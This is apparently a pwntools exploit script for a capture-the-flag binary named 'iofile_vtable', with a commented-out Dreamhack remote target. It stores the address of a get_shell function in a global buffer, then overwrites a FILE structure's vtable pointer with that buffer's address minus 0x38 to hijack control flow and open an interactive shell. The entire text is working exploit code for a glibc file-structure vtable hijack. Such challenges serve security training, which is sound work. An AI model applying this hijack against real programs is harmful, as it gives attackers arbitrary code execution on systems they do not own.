from pwn import *
context.update(log_level='debug')

elf = ELF('iofile_vtable')
addr_name = elf.symbols['name']
addr_shell = elf.symbols['get_shell']
log.info('addr_name: ' + hex(addr_name))
log.info('addr_shell: ' + hex(addr_shell))

p = process('iofile_vtable')
#p = remote('host1.dreamhack.games', 12112)
p.sendlineafter(': ', p64(addr_shell))

p.sendlineafter('> ', '4')
raw_input('debug: ' + str(p.pid))
p.sendlineafter(': ', p64(addr_name - 0x38))

p.sendlineafter('> ', '2')

p.interactive()
